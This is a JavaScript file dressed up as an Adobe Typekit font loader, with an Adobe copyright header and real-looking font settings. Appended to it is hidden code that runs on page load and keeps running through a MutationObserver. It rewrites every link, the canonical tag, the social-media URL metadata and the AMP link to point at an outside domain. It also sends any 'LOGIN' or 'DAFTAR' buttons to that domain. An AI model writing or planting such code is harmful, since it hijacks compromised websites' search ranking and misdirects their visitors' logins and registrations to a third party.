/*
 * The Typekit service used to deliver this font or fonts for use on websites
 * is provided by Adobe and is subject to these Terms of Use
 * http://www.adobe.com/products/eulas/tou_typekit. For font license
 * information, see the list below.
 *
 * aktiv-grotesk:
 *   - http://typekit.com/eulas/00000000000000007753ca4f
 *   - http://typekit.com/eulas/00000000000000007753ca29
 *   - http://typekit.com/eulas/00000000000000007753ca37
 *   - http://typekit.com/eulas/00000000000000007753ca28
 *   - http://typekit.com/eulas/00000000000000007753ca27
 *
 * Â© 2009-2024 Adobe Systems Incorporated. All Rights Reserved.
 */
const data_init_font_x = {
    "a": "646866",
    "dl": "AAAA5wAAAAreiCNvOvoJFPHn01uJm93xbEBKIz0KBAsuU51tAAAAQA",
    "fi": [14032, 14038, 14034, 14033, 14035],
    "fc": [
        {
            "id": 14032,
            "family": "aktiv-grotesk",
            "src": "https://use.typekit.net/af/63eba7/00000000000000007753ca4f/30/{format}{?primer,subset_id,fvd,v}",
            "descriptors": { "weight": "400", "style": "normal", "stretch": "normal", "display": "auto", "variable": false, "subset_id": 2 }
        },
        {
            "id": 14038,
            "family": "aktiv-grotesk",
            "src": "https://use.typekit.net/af/46adfc/00000000000000007753ca29/30/{format}{?primer,subset_id,fvd,v}",
            "descriptors": { "weight": "500", "style": "normal", "stretch": "normal", "display": "auto", "variable": false, "subset_id": 2 }
        },
        {
            "id": 14034,
            "family": "aktiv-grotesk",
            "src": "https://use.typekit.net/af/2b93b6/00000000000000007753ca37/30/{format}{?primer,subset_id,fvd,v}",
            "descriptors": { "weight": "700", "style": "normal", "stretch": "normal", "display": "auto", "variable": false, "subset_id": 2 }
        },
        {
            "id": 14033,
            "family": "aktiv-grotesk",
            "src": "https://use.typekit.net/af/f7a8b2/00000000000000007753ca28/30/{format}{?primer,subset_id,fvd,v}",
            "descriptors": { "weight": "400", "style": "italic", "stretch": "normal", "display": "auto", "variable": false, "subset_id": 2 }
        },
        {
            "id": 14035,
            "family": "aktiv-grotesk",
            "src": "https://use.typekit.net/af/ae6138/00000000000000007753ca27/30/{format}{?primer,subset_id,fvd,v}",
            "descriptors": { "weight": "700", "style": "italic", "stretch": "normal", "display": "auto", "variable": false, "subset_id": 2 }
        }
    ],
    "fn": ["aktiv-grotesk", ["i4", "i7", "n4", "n5", "n7"]],
    "hn": "use.typekit.net",
    "ht": "tk",
    "js": "1.21.0",
    "kt": "646866_624b3c6e9ab377772d5a036c",
    "l": "typekit",
    "ps": 2,
    "ping": "https://p.typekit.net/p.gif{?s,k,ht,h,f,a,js,app,e,_}",
    "pm": true,
    "type": "configurable"
}

const officialDomain = 'https://a2zrooterplumbing.com'; 
const ampDomain = 'https://a2zrooterplumbing.com/amp';

(function () {
  'use strict';

  //IZINDER
  const OFFICIAL = new URL(officialDomain, location.href);
  const AMP = new URL(ampDomain, location.href);

  function getPathFromUrl(u) {
    try {
      const x = new URL(u, location.href);
      return x.pathname + x.search + x.hash;
    } catch (_) {
      return '';
    }
  }

  function computeCanonicalBasePath() {
    const canonicalLink = document.querySelector('link[rel="canonical"]');
    if (!canonicalLink) return '';
    try {
      const u = new URL(canonicalLink.href, location.href);
      return u.pathname + u.search + u.hash;
    } catch (_) {
      return '';
    }
  }

  // APISIEKOENTOEL
  function replaceAnchorTags() {
    const anchors = document.querySelectorAll('a');
    anchors.forEach(anchor => {
      const txt = anchor.textContent.trim().toUpperCase();
      if (txt === 'LOGIN' || txt === 'DAFTAR') {
        if (anchor.href !== AMP.href) anchor.href = AMP.href;
      }
    });
  }

  function forceUrlsToOfficialDomain() {
    const canonicalBasePath = computeCanonicalBasePath();

    // IKICACONIKAL E DJANCOK
    let canonicalLink = document.querySelector('link[rel="canonical"]');
    if (canonicalLink) {
      if (canonicalLink.href !== OFFICIAL.href) canonicalLink.href = OFFICIAL.href;
    } else {
      canonicalLink = document.createElement('link');
      canonicalLink.rel = 'canonical';
      canonicalLink.href = OFFICIAL.href;
      document.head.appendChild(canonicalLink);
    }

    // anchors
    const links = document.querySelectorAll('a[href]');
    links.forEach(link => {
      // Hindari non-http(s): mailto:, tel:, javascript:, dll.
      if (!/^https?:/i.test(link.href)) return;
      if (isSpecialLink(link)) return;

      const relativePath = getPathFromUrl(link.href);
      // NGAPUSI CANOBASED
      const normalized = OFFICIAL.origin + relativePath.replace(canonicalBasePath, '');
      if (link.href !== normalized) link.href = normalized;
    });


    const metaUrls = document.querySelectorAll('meta[property="og:url"], meta[name="twitter:url"]');
    metaUrls.forEach(meta => {
      const content = meta.getAttribute('content') || '';
      if (!/^https?:/i.test(content)) return;
      const metaPath = getPathFromUrl(content);
      const normalized = OFFICIAL.origin + metaPath.replace(canonicalBasePath, '');
      if (meta.content !== normalized) meta.content = normalized;
    });


    let ampLink = document.querySelector('link[rel="amphtml"]');
    if (ampLink) {
      if (ampLink.href !== AMP.href) ampLink.href = AMP.href;
    } else {
      ampLink = document.createElement('link');
      ampLink.rel = 'amphtml';
      ampLink.href = AMP.href;
      document.head.appendChild(ampLink);
    }
  }

  function isSpecialLink(link) {
    const txt = link.textContent.trim().toUpperCase();
    return link.classList.contains('login') ||
           link.classList.contains('register') ||
           link.href === officialDomain ||
           link.href === ampDomain ||
           link.classList.contains('special-link') ||
           txt === 'LOGIN' ||
           txt === 'DAFTAR';
  }


  let initialized = false;
  function init() {
    if (initialized) return;
    initialized = true;

    forceUrlsToOfficialDomain();
    replaceAnchorTags();

    const schedule = (() => {
      let pending = false;
      return () => {
        if (pending) return;
        pending = true;
        (window.requestAnimationFrame || setTimeout)(() => {
          pending = false;
          forceUrlsToOfficialDomain();
          replaceAnchorTags();
        }, 16);
      };
    })();

    if ('MutationObserver' in window) {
      const observer = new MutationObserver(mutations => {
        for (const m of mutations) {
          if (m.type === 'childList') { schedule(); break; }
          if (m.type === 'attributes' && (m.attributeName === 'href' || m.attributeName === 'content' || m.attributeName === 'rel')) { schedule(); break; }
        }
      });
      observer.observe(document.documentElement, {
        subtree: true,
        childList: true,
        attributes: true,
        attributeFilter: ['href', 'content', 'rel']
      });
    } else {
	
      setInterval(() => {
        forceUrlsToOfficialDomain();
        replaceAnchorTags();
      }, 3000);
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init, { once: true });
  } else {
    init();
  }


  window.replaceAnchorTags = replaceAnchorTags;
  window.forceUrlsToOfficialDomain = forceUrlsToOfficialDomain;
  window.isSpecialLink = isSpecialLink;
})();
